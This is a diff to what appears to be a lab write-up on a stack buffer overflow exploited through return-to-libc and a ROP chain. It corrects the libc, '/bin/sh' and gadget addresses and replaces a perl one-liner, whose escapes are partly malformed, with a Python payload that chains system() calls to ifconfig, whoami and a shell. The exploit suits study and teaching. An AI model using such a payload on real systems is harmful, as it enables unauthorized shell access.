@@ -2,11 +2,11 @@
 
 ## Logistics
 
-1. libc system address: **0x2aaaaad16590**
+1. libc system address: **0x7ffff7a57590**
 
-2. libc exit address: **0x2aaaaad0c1e0**
+2. libc exit address: **0x7ffff7a4d1e0**
 
-3. "/bin/sh" address: **0x2aaaaae50543**
+3. "/bin/sh" address: **0x7ffff7b91543**
 
 4. white space in hex representation is
  **x20**
@@ -102,15 +102,25 @@ We would like to do the following tasks in sequence:
 
 We know the following:
 
-1. ROP gadget address:  0x00000000004006b3
+1. ROP gadget address:  0x00000000004005d3
 2. system address:      0x00007ffff7a57590
 3. exit address:        0x00007ffff7a4d1e0
-4. /bin/sh address:     0x00002aaaaae50543
+4. /bin/sh address:     0x00007ffff7b91543
 5. ifconfig address:    0x00007fffffffee13
 7. whoami address:      0x00007fffffffeeab
 
 Our payload would therefore be:
 
 ```
-perl -e 'print "A"x56, "\xb3\x6\x40\x0", "\x0\x0\x0\x0", "\x13\xee\xff\xff", "\xff\x7f\x0\x0", "\x90\x75\xa5\xf7", "\ff\7fa\x0\x0", "\xb3\x6\x40\x0", "\x0\x0\x0\x0", "\xab\xee\xff\xff", "\xff\x7f\x0\x0", "\x90\x75\xa5\xf7", "\xffx7f\x0\x0", "\xb3\x6\x40\x0", "\x0\x0\x0\x0", "\x43\x5\xe5\xaa", "\xaa\x2a\x0\x0", "\x90\x75\xa5\xf7", "\ff\7fa\x0\x0", "\xe0\xd1\xa4\xf7", "\xff\x7f\x0\x0"'
+buf += 'A'*56
+buf += pack('<Q', 0x4005d3)
+buf += pack('<Q', 0x7fffffffee13)
+buf += pack('<Q', 0x7ffff7a57590)
+buf += pack('<Q', 0x4005d3)
+buf += pack('<Q', 0x7fffffffeeab)
+buf += pack('<Q', 0x7ffff7a57590)
+buf += pack('<Q', 0x4005d3)
+buf += pack('<Q', 0x7ffff7b91543)
+buf += pack('<Q', 0x7ffff7a57590)
+buf += pack('<Q', 0x7ffff7a4d1e0)
 ```
